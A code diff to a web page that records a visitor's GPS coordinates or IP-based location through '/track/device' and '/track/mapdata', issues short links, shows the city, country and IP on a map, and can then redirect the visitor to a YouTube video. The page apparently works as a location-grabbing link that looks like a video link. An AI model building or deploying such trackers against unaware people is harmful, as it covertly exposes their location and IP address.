@@ -18,8 +18,9 @@
     const urlParams = new URLSearchParams(window.location.search);
     const shouldRedirect = urlParams.get('redirectYoutube') === 'true';
     const youtubeUrl = urlParams.get('youtubeUrl') || 'https://www.youtube.com/watch?v=mYRV_B_QVGw';
-
+    let latestShortCode = null;
     let mapInstance = null;
+
     function showMap(lat, lon) {
       if (lat == null || lon == null) return;
       const el = document.getElementById('map');
@@ -36,40 +37,61 @@
       }
     }
 
-    function postShortLinkFromCoords(lat, lon){
+    function updateStatusFromData(data, code) {
+      const city = data.city || 'Unknown';
+      const country = data.country || 'Unknown';
+      const ip = data.ip || '';
+      const statusLine = 'Code: ' + (code ?? 'Unknown') + ' | City: ' + city + ' | Country: ' + country + ' | IP: ' + ip;
+      const mapStatus = document.getElementById('map-status');
+      mapStatus.style.display = 'block';
+      mapStatus.innerText = statusLine;
+    }
+
+    function postShortLinkFromCoords(lat, lon) {
       fetch('/track/device', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({latitude: lat, longitude: lon})})
       .then(r => r.text())
-      .then(c => {
-        const short = 'Short Link: http://localhost:8080/' + c;
+      .then(code => {
+        latestShortCode = code;
+        const short = 'Short Link: http://localhost:8080/' + code;
         document.getElementById('short').innerText = short;
-        showMap(lat, lon);
-        if (shouldRedirect) window.location.href = youtubeUrl;
+        // Get IP-based data for status/map
+        fetch('/track/mapdata', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({})})
+          .then(r => r.json())
+          .then(data => {
+            updateStatusFromData(data, code);
+            const lat2 = data.lat;
+            const lon2 = data.lon;
+            if (Number.isFinite(lat2) && Number.isFinite(lon2)) {
+              showMap(lat2, lon2);
+            }
+            if (Number.isFinite(lat2) && Number.isFinite(lon2) && shouldRedirect) {
+              window.location.href = youtubeUrl;
+            }
+          });
       });
     }
 
     function postShortLinkFromIP(){
       fetch('/track/device', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({})})
         .then(r => r.text())
-        .then(shortCode => {
-          const short = 'Short Link: http://localhost:8080/' + shortCode;
+        .then(code => {
+          latestShortCode = code;
+          const short = 'Short Link: http://localhost:8080/' + code;
           document.getElementById('short').innerText = short;
-          // Try to obtain IP-based coordinates for a map
+          // IP-based data for status/map
           fetch('/track/mapdata', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({})})
             .then(r => r.json())
             .then(data => {
+              updateStatusFromData(data, code);
               const lat = data.lat;
               const lon = data.lon;
               if (Number.isFinite(lat) && Number.isFinite(lon)) {
                 showMap(lat, lon);
-              } else {
-                const status = document.getElementById('map-status');
-                status.style.display = 'block';
-                status.innerText = 'Location could not be determined from IP. Map is unavailable.';
               }
               if (Number.isFinite(lat) && Number.isFinite(lon) && shouldRedirect) {
                 window.location.href = youtubeUrl;
               }
-            })
+            });
         });
     }
 
